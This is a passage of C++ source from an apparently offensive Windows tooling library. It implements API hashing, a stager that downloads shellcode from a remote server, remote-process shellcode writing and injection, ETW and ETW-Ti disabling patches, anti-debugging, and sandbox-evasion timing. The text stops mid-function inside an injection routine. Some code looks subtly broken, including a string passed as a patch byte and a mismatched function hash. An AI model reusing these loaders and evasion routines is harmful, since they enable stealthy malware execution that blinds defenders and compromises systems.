#include "malapi.hpp"

namespace malapi
{
	//
	// GetModuleHandle implementation with API hashing.
	//
	HMODULE GetModuleHandleC(_In_ ULONG dllHash)
	{
#ifdef _WIN64
		PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList;
#else // https://www.renenyffenegger.ch/notes/Windows/development/process/PEB
		PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readfsdword(0x30))->Ldr->InMemoryOrderModuleList;
#endif
		PLIST_ENTRY next = head->Flink;

		PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16);

		while (next != head)
		{
			module = (PLDR_MODULE)((PBYTE)next - 16);
			if (module->BaseDllName.Buffer != NULL)
			{
				if (dllHash - HashStringFowlerNollVoVariant1a(module->BaseDllName.Buffer) == 0)
					return (HMODULE)module->BaseAddress;
			}
			next = next->Flink;
		}

		return NULL;
	}

	//
	// GetProcAddress implementation with API hashing.
	//
	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash)
	{
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
		PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		if (exports->AddressOfNames != 0)
		{
			PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals);
			PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames);
			PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions);

			for (DWORD i = 0; i < exports->NumberOfNames; i++) {
				LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
				if (HashStringFowlerNollVoVariant1a(name) == funcHash) {
					PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]);
					return (FARPROC)function;
				}
			}
		}
		return NULL;
	}

	//
	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
	// Returns NULL on failure.
	//
	DWORD GetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntquerysysteminformation = HashStringFowlerNollVoVariant1a("NtQuerySystemInformation");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeNtQuerySystemInformation NtQuerySystemInformation = (typeNtQuerySystemInformation)GetProcAddressC(ntdll, hash_ntquerysysteminformation);
		if (!NtQuerySystemInformation) return NULL;

		DWORD pid = NULL, returnlength = 0, nextoffset = 0, name_hash = 0;
		PSYSTEM_PROCESS_INFORMATION process = NULL, processinfoptr = NULL;
		NTSTATUS status = STATUS_SUCCESS;

		// Get size of systemprocessinformation
		NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS::SystemProcessInformation, NULL, 0, &returnlength);
		returnlength += 0x10000;
		if (returnlength == 0)
			return NULL;

		process = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(returnlength);
		if (!process) return NULL;

		status = NtQuerySystemInformation(SystemProcessInformation, process, returnlength, &returnlength);
		if (!NT_SUCCESS(status))
			goto CLEANUP;

		processinfoptr = process;
		do
		{
			if (processinfoptr->ImageName.Buffer)
			{
				name_hash = HashStringFowlerNollVoVariant1a(processinfoptr->ImageName.Buffer);
				for (size_t i = 0; i < EntryCount; i++)
				{
					if (HashList[i] == name_hash)
					{
						pid = (DWORD)(UINT_PTR)processinfoptr->UniqueProcessId;
						break;
					}
				}
			}

			processinfoptr = (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)processinfoptr) + processinfoptr->NextEntryOffset);
		} while (processinfoptr->NextEntryOffset);

	CLEANUP:
		if (process)
			HeapFree(process);

		return pid;
	}

	//
	// Uses OpenProcess to get a handle to the process from a given PID
	// Returns NULL on failure.
	//
	HANDLE GetProcessHandle(DWORD process_id)
	{
		HANDLE process = INVALID_HANDLE_VALUE;
		constexpr DWORD hash_krn32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_openprocess = HashStringFowlerNollVoVariant1a("OpenProcess");

		HMODULE kernel32 = GetModuleHandleC(hash_krn32);
		if (!kernel32)
		{
			LOG_ERROR("GetModuleHandle failed to get kernel32.dll.");
			return NULL;
		}

		typeOpenProcess OpenProcessC = (typeOpenProcess)GetProcAddressC(kernel32, hash_openprocess);
		if (!OpenProcessC)
		{
			LOG_ERROR("GetProcAddress failed to get OpenProcess.");
			return NULL;
		}

		process = OpenProcessC(PROCESS_ALL_ACCESS, FALSE, process_id);

		LOG_SUCCESS("Process Handle: 0x%08lX", process);

		return process;
	}

	//
	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
	//
	BOOL CheckFileExists(_In_ LPCSTR FullPath)
	{
		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_getfileattributes = HashStringFowlerNollVoVariant1a("GetFileAttributes");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;
		typeGetFileAttributesA _GetFileAttributesA = (typeGetFileAttributesA)GetProcAddressC(kernel32, hash_getfileattributes);
		if (!_GetFileAttributesA) return NULL;

		DWORD attribs = _GetFileAttributesA(FullPath);
		return (attribs != INVALID_FILE_ATTRIBUTES) && !(attribs & FILE_ATTRIBUTE_DIRECTORY);
	}

	//
	// Close a given handle via ntdll.dll!NtClose.
	//
	VOID CloseHandle(_In_ HANDLE Handle)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntclose = HashStringFowlerNollVoVariant1a("NtClose");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return;
		typeNtClose NtClose = (typeNtClose)GetProcAddressC(ntdll, hash_ntclose);

		NtClose(Handle);
	}

	//
	// Uses VirtualAllocExNuma, VirtualProtectEx and WriteProcessMemory to write shellcode into memory
	// Returns Base Address Handle on Success
	// Returns NULL on failure.
	//
	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		SIZE_T bytes_written = 0;
		PVOID address_ptr = NULL;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

		typeVirtualAllocExNuma VirtualAllocExNumaC = NULL;
		typeVirtualProtectEx VirtualProtectExC = NULL;
		typeWriteProcessMemory WriteProcessMemoryC = NULL;
		typeGetLastError GetLastErrorC = NULL;

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_virtualallocexnuma = HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) return NULL;

		VirtualAllocExNumaC = (typeVirtualAllocExNuma)GetProcAddressC(kernel32, hash_virtualallocexnuma);
		VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
		WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

		address_ptr = VirtualAllocExNumaC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, 0);
		if (address_ptr == NULL)
		{
			LOG_ERROR("Failed to allocate memory space (Code: %016llx)", GetLastErrorC());
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: %016llx", address_ptr);

		success = WriteProcessMemoryC(process_handle, address_ptr, shellcode, shellcode_size, &bytes_written);
		if (!success)
		{
			LOG_ERROR("Error writing shellcode to memory (Code: %016llx)", GetLastErrorC());
			return FALSE;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!VirtualProtectExC(process_handle, address_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protection))
		{
			LOG_ERROR("Failed to change protection type (Code: %016llx)", GetLastErrorC());
			return FALSE;
		}
		else LOG_SUCCESS("Protection changed to RX.");

		return address_ptr;
	}

	//
	// Stage Shellcode to Memory via HTTPS
	// Requires Valid SSL Certificate if using HTTPS
	//
	// Returns Shellcode & Shellcode Size
	//
	BOOL DownloadShellcode(_In_ LPCWSTR base_url, _In_ LPCWSTR uri_path, BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE winhttp = NULL;

		LPCWSTR user_agent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100 ABLELDR/1.1";
		DWORD bytes_read = 0;
		DWORD resp_size = 0;
		PBYTE resp_buffer = NULL;
		CHAR* resp_chunk[1024] = { 0 };

		HINTERNET session = NULL;
		HINTERNET connect = NULL;
		HINTERNET request = NULL;

#pragma region Imports

		typeWinHttpOpen WinHttpOpenC = NULL;
		typeWinHttpConnect WinHttpConnectC = NULL;
		typeWinHttpSendRequest WinHttpSendRequestC = NULL;
		typeWinHttpOpenRequest WinHttpOpenRequestC = NULL;
		typeWinHttpReceiveResponse WinHttpReceiveResponseC = NULL;
		typeWinHttpReadData WinHttpReadDataC = NULL;
		typeWinHttpCloseHandle WinHttpCloseHandleC = NULL;

		typeLoadLibraryA LoadLibraryC = NULL;
		typeGetLastError GetLastErrorC = NULL;

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_loadlibrarya = HashStringFowlerNollVoVariant1a("LoadLibraryA");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		constexpr ULONG hash_winhttpopen = HashStringFowlerNollVoVariant1a("WinHttpOpen");
		constexpr ULONG hash_winhttpconnect = HashStringFowlerNollVoVariant1a("WinHttpConnect");
		constexpr ULONG hash_winhttpsendrequest = HashStringFowlerNollVoVariant1a("WinHttpSendRequest");
		constexpr ULONG hash_winhttpopenrequest = HashStringFowlerNollVoVariant1a("WinHttpOpenRequest");
		constexpr ULONG hash_winhttpreceiveresponse = HashStringFowlerNollVoVariant1a("WinHttpReceiveResponse");
		constexpr ULONG hash_winhttpreaddata = HashStringFowlerNollVoVariant1a("WinHttpReadData");
		constexpr ULONG hash_winhttpclosehandle = HashStringFowlerNollVoVariant1a("WinHttpCloseHandle");

		kernel32 = GetModuleHandleC(hash_kernel32);

		LoadLibraryC = (typeLoadLibraryA)GetProcAddressC(kernel32, hash_loadlibrarya);
		winhttp = LoadLibraryC("Winhttp.dll");
		//PDARKMODULE winhttp_dll = DarkLoadLibrary(LOAD_LOCAL_FILE, L"C:\\Windows\\System32\\winhttp.dll", NULL, 0, NULL);
		//winhttp = (HMODULE)winhttp_dll->ModuleBase;

		if (!kernel32 || !winhttp) goto CLEANUP;

		WinHttpOpenC = (typeWinHttpOpen)GetProcAddressC(winhttp, hash_winhttpopen);
		WinHttpConnectC = (typeWinHttpConnect)GetProcAddressC(winhttp, hash_winhttpconnect);
		WinHttpSendRequestC = (typeWinHttpSendRequest)GetProcAddressC(winhttp, hash_winhttpsendrequest);
		WinHttpOpenRequestC = (typeWinHttpOpenRequest)GetProcAddressC(winhttp, hash_winhttpopenrequest);
		WinHttpReceiveResponseC = (typeWinHttpReceiveResponse)GetProcAddressC(winhttp, hash_winhttpreceiveresponse);
		WinHttpReadDataC = (typeWinHttpReadData)GetProcAddressC(winhttp, hash_winhttpreaddata);
		WinHttpCloseHandleC = (typeWinHttpCloseHandle)GetProcAddressC(winhttp, hash_winhttpclosehandle);

		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

#pragma endregion

		session = WinHttpOpenC(user_agent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		if (session == NULL)
		{
			LOG_ERROR("Failed to start session. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Session Started. (Code: %016llX)", session);

		if (ssl_enabled)
		{
			LOG_INFO("Stager Over HTTPS");

			connect = WinHttpConnectC(session, base_url, INTERNET_DEFAULT_HTTPS_PORT, 0);
			if (connect == NULL)
			{
				LOG_ERROR("Failed to connect to web server. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Connected to Session. (Code: %016llX)", connect);

			request = WinHttpOpenRequestC(connect, L"GET", uri_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE));
			if (request == NULL)
			{
				LOG_ERROR("Failed to open request. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Request Opened For: %ls%ls. (Code: %016llX)", base_url, uri_path, request);
		}
		else
		{
			LOG_INFO("Stager Over HTTP");

			connect = WinHttpConnectC(session, base_url, INTERNET_DEFAULT_HTTP_PORT, 0);
			if (!connect)
			{
				LOG_ERROR("Failed to connect to web server. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Connected to Session. (Code: %016llX)", connect);

			request = WinHttpOpenRequestC(connect, L"GET", uri_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (WINHTTP_FLAG_REFRESH));
			if (request == NULL)
			{
				LOG_ERROR("Failed to open request. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Request Opened For: %ls%ls. (Code: %016llX)", base_url, uri_path, request);

			if (!WinHttpSendRequestC(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
			{
				LOG_ERROR("Failed to Send Request. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Request Sent");
		}

		if (!WinHttpReceiveResponseC(request, NULL))
		{
			LOG_ERROR("Failed to Receive Response. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Request Received");

		do {
			if (!WinHttpReadDataC(request, resp_chunk, sizeof(resp_chunk), &bytes_read) || bytes_read == 0)
			{
				LOG_INFO("Failed to Read Data or All Data Has Been Read. (Code: %016llX)", GetLastErrorC());
			}

			if (!resp_buffer)
			{
				resp_buffer = (PBYTE)HeapAlloc(bytes_read);
			}
			resp_buffer = (PBYTE)HeapReAlloc(resp_buffer, (resp_size + bytes_read));

			resp_size += bytes_read;

			memcpy(resp_buffer + (resp_size - bytes_read), resp_chunk, bytes_read);
			memset(resp_chunk, 0, 1024);
		} while (bytes_read > 0);

		*shellcode = resp_buffer;
		*shellcode_size = resp_size;

		success = TRUE;
		LOG_SUCCESS("Payload Downloaded Successfully.");

	CLEANUP:
		if (session) WinHttpCloseHandleC(session);
		if (connect) WinHttpCloseHandleC(connect);
		if (request) WinHttpCloseHandleC(request);
		return success;
	}

	//
	// Get epoch timestamp (ms) from SHARED_USER_DATA
	//
	SIZE_T GetTimestamp(void)
	{
		const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks.
		const size_t TICKS_PER_MILLISECOND = 10000; // A tick is 100ns.
		LARGE_INTEGER time;
		time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14); // Read LowPart as unsigned long.
		time.HighPart = *(long*)(0x7FFE0000 + 0x1c); // Read High1Part as long.
		return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
	}

	//
	// Sleep implementation using `get_timestamp`,
	// will crash the process if time skipping is detected.
	//
	void SleepMs(_In_ SIZE_T Ms)
	{
		volatile size_t x = 0;
		size_t end_time = GetTimestamp() + Ms;
		while (GetTimestamp() < end_time) x += 1;

		// time skip check (crash process if so)
		if (GetTimestamp() > end_time + 1000)
		{
			volatile size_t crash = 0;
			x = *(int*)crash;
		}
	}

	//
	// Returns handle to current process' heap.
	//
	HANDLE GetProcessHeap(void)
	{
		return reinterpret_cast<HANDLE>(GetTEB()->ProcessEnvironmentBlock->ProcessHeap);
	}

	//
	// Returns TEB pointer for current process.
	//
	PTEB GetTEB(void)
	{
		PTEB teb;
#ifdef _WIN64
		teb = reinterpret_cast<PTEB>(__readgsqword(0x30));
#else
		teb = reinterpret_cast<PTEB>(__readfsdword(0x18));
#endif
		return teb;
	}

	//
	// Returns PEB pointer for current process.
	//
	PPEB GetPEB(void)
	{
		PPEB peb;
#ifdef _WIN64
		peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
		peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
		return peb;
	}

	//
	// Abuse a bug to disable ETW-Ti for a target process.
	// More info: https://www.legacyy.xyz/defenseevasion/windows/2024/04/24/disabling-etw-ti-without-ppl.html
	//
	BOOL DisableETWTi(_In_ HANDLE TargetProcess)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_ntsetinformationprocess = HashStringFowlerNollVoVariant1a("NtSetInformationProcess");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return FALSE;
		typeNtSetInformationProcess NtSetInformationProcess = (typeNtSetInformationProcess)GetProcAddressC(ntdll, hash_ntsetinformationprocess);
		if (!NtSetInformationProcess) return FALSE;

		// Prepare for NtSetInformationProcess
		PROCESS_LOGGING_INFORMATION pli = { 0 };
		pli.Flags = (ULONG)0xf;
		pli.EnableReadVmLogging = 0;
		pli.EnableWriteVmLogging = 0;
		pli.EnableProcessSuspendResumeLogging = 0;
		pli.EnableThreadSuspendResumeLogging = 0;
		pli.Reserved = 26;

		NTSTATUS status = NtSetInformationProcess(
			TargetProcess,
			ProcessEnableLogging,
			&pli,
			sizeof(_PROCESS_LOGGING_INFORMATION));

		return NT_SUCCESS(status);
	}

	//
	// Patch ETW
	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
	//
	BOOL PatchEtwSsn(void)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

#pragma region imports
		typeVirtualProtectEx VirtualProtectExC = NULL;
		FARPROC NtTraceEventC = NULL;

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_nttraceevent = HashStringFowlerNollVoVariant1a("NtTraceEvent");
		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = GetModuleHandleC(hash_ntdll);
		if (kernel32 == NULL || ntdll == NULL) return success;

		VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
		NtTraceEventC = (FARPROC)GetProcAddressC(ntdll, hash_nttraceevent);

#pragma endregion

#define x64_ret "0x3c"

		if (!VirtualProtectExC(0, NtTraceEventC, 1, PAGE_EXECUTE_READWRITE, &old_protection)) goto CLEANUP;
		memcpy(NtTraceEventC, x64_ret, 1);
		if (!VirtualProtectExC(0, NtTraceEventC, 1, old_protection, &old_protection)) goto CLEANUP;

		success = TRUE;

	CLEANUP:
		return success;
	}

	//
	// Patch ETW via EtwEventWrite/EtwEventWriteFull
	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
	//
	BOOL PatchEtwEventWrite(void)
	{
#define x64_ret		0xc3
#define x64_mov		0xb8
#define x64_stub	0x20
#define x64_xor		0x48
#define MAX_SEARCH_INDEX 0xFF

		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;
		BYTE patch[] = {
			x64_xor, 0x31, 0xC0, // xor rax, rax
			x64_ret				 // ret
		};
		BYTE backup[sizeof(patch)] = { 0 };
		int offset = 0;
		int func_length = 0;

#pragma region imports

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("kernel32.dll");
		constexpr ULONG hash_virtualprotextex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");

		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_etweventwrite = HashStringFowlerNollVoVariant1a("EtwEventWrite");
		constexpr ULONG hash_etweventwritefull = HashStringFowlerNollVoVariant1a("EtwEventWriteFull");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll || !kernel32) return success;

		typeVirtualProtectEx VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotextex);
		PBYTE EtwEventWriteC = (PBYTE)GetProcAddressC(ntdll, hash_etweventwrite);
		PBYTE EtwEventWriteFullC = (PBYTE)GetProcAddressC(ntdll, hash_etweventwritefull);

#pragma endregion

		while (TRUE)
		{
			if (EtwEventWriteC[func_length] == x64_ret && EtwEventWriteC[func_length + 1] == 0xCC)
				break;

			if (func_length == MAX_SEARCH_INDEX)
			{
				LOG_ERROR("Unable to find EtwEventWrite");
				goto CLEANUP;
			}

			func_length++;
		}

		while (!EtwEventWriteFullC)
		{
			if (EtwEventWriteC[func_length] == 0xE8)
			{
				offset = EtwEventWriteC[func_length + 1];
				EtwEventWriteFullC = &EtwEventWriteC[func_length] + 1 + sizeof(DWORD) + offset;
				break;
			}

			if (func_length == MAX_SEARCH_INDEX)
			{
				LOG_ERROR("Unable to find EtwEventWriteFull");
				goto CLEANUP;
			}
			func_length--;
		}

		LOG_SUCCESS("Found EtwEventWriteFull at %016llX", EtwEventWriteFullC);

		if (!VirtualProtectExC(0, EtwEventWriteFullC, sizeof(patch), PAGE_READWRITE, &old_protection)) goto CLEANUP;

		memcpy(&backup, EtwEventWriteFullC, sizeof(patch)); // Backup the EtwEventWriteFull address
		memcpy(EtwEventWriteFullC, &patch, sizeof(patch)); // Patch the address

		// Restore opcodes if mem protections cannot be reverted
		if (!VirtualProtectExC(0, EtwEventWriteFullC, sizeof(patch), old_protection, &old_protection))
		{
			memcpy(EtwEventWriteFullC, &backup, sizeof(patch));
			goto CLEANUP;
		}

		success = TRUE;
	CLEANUP:
		return success;
	}

	//
	// Returns PEB pointer for current process. (Retrieved from TEB)
	//
	PPEB GetPEBFromTEB(void)
	{
		PPEB peb;
#ifdef _WIN64
		peb = reinterpret_cast<PTEB>(__readgsqword(0x30))->ProcessEnvironmentBlock;
#else
		peb = reinterpret_cast<PTEB>(__readfsdword(0x18))->ProcessEnvironmentBlock;
#endif
		return peb;
	}

	//
	// Search a region of memory for an egg. Returns NULL on failure.
	//
	PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength)
	{
		if (!RegionStart || !RegionLength || !Egg || !EggLength)
			return NULL;

		for (CHAR* pchar = (CHAR*)RegionStart; RegionLength >= EggLength; ++pchar, --RegionLength)
		{
			if (!memcmp(pchar, Egg, EggLength))
				return pchar;
		}
		return NULL;
	}

	//
	// Gets the process cookie from the PEB
	//
	ULONG GetProcessCookie(void)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_NtQueryInformationProcess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeNtQueryInformationProcess NtQueryInformationProcess = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_NtQueryInformationProcess);
		if (!NtQueryInformationProcess) return NULL;

		// get process cookie
		ULONG cookie = 0;
		NTSTATUS result = NtQueryInformationProcess((HANDLE)-1, ProcessCookie, &cookie, sizeof(ULONG), NULL);

		return NT_SUCCESS(result) ? cookie : NULL;
	}

	//
	// Allocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapAlloc(_In_ SIZE_T Size)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlallocateheap = HashStringFowlerNollVoVariant1a("RtlAllocateHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlAllocateHeap RtlAllocateHeap = (typeRtlAllocateHeap)GetProcAddressC(ntdll, hash_rtlallocateheap);
		if (!RtlAllocateHeap) return NULL;

		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
		return RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	}

	//
	// ReAllocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapReAlloc(_In_ PVOID BlockAddress, _In_ SIZE_T Size)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlreallocateheap = HashStringFowlerNollVoVariant1a("RtlReAllocateHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlReAllocateHeap RtlReAllocateHeap = (typeRtlReAllocateHeap)GetProcAddressC(ntdll, hash_rtlreallocateheap);
		if (!RtlReAllocateHeap) return NULL;

		return RtlReAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, BlockAddress, Size);
	}

	//
	// Free a block of memory in the current process' heap.
	// Returns TRUE on success, FALSE on failure.
	//
	BOOL HeapFree(_In_ PVOID BlockAddress)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlfreeheap = HashStringFowlerNollVoVariant1a("RtlFreeHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlFreeHeap RtlFreeHeap = (typeRtlFreeHeap)GetProcAddressC(ntdll, hash_rtlfreeheap);
		if (!RtlFreeHeap) return NULL;

		return RtlFreeHeap(GetProcessHeap(), NULL, BlockAddress) ? TRUE : FALSE;
	}

	//
	// Hide a given thread from the debugger by setting THREAD_INFO_CLASS::ThreadHideFromDebugger
	// Defaults to current thread unless specified otherwise.
	//
	VOID HideFromDebugger(_In_ HANDLE ThreadHandle)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntsetinformationthread = HashStringFowlerNollVoVariant1a("NtSetInformationThread");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return;
		typeNtSetInformationThread NtSetInformationThread = (typeNtSetInformationThread)GetProcAddressC(ntdll, hash_ntsetinformationthread);
		if (!NtSetInformationThread) return;

		NtSetInformationThread(ThreadHandle, ThreadHideFromDebugger, NULL, 0);
		return;
	}

	////////////////////////////////////////////////////
	//
	// Injection Techniques
	//

	//
	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
	//
	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		NTSTATUS status;

		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
		constexpr DWORD hash_ntcreatesection = HashStringFowlerNollVoVariant1a("NtCreateSection");
		constexpr DWORD hash_ntmapviewofsection = HashStringFowlerNollVoVariant1a("NtMapViewOfSection");
		constexpr DWORD hash_ntunmapviewofsection = HashStringFowlerNollVoVariant1a("NtUnmapViewOfSection");
		constexpr DWORD hash_rtlcreateuserthread = HashStringFowlerNollVoVariant1a("RtlCreateUserThread");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return FALSE;

		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddressC(ntdll, hash_ntcreatesection);
		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
		typeNtUnmapViewOfSection NtUnmapViewOfSection = (typeNtUnmapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
		typeRtlCreateUserThread RtlCreateUserThread = (typeRtlCreateUserThread)GetProcAddressC(ntdll, hash_rtlcreateuserthread);
		typeNtClose NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);
		if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread || !NtCloseC) return FALSE;

		LARGE_INTEGER section_size = { 0 };
		HANDLE section_handle = NULL, target_thread = NULL;
		PVOID addr_local_section = NULL, addr_remote_section = NULL;
		section_size.QuadPart = shellcode_size;

		// Create memory section.
		status = NtCreateSection(
			&section_handle,
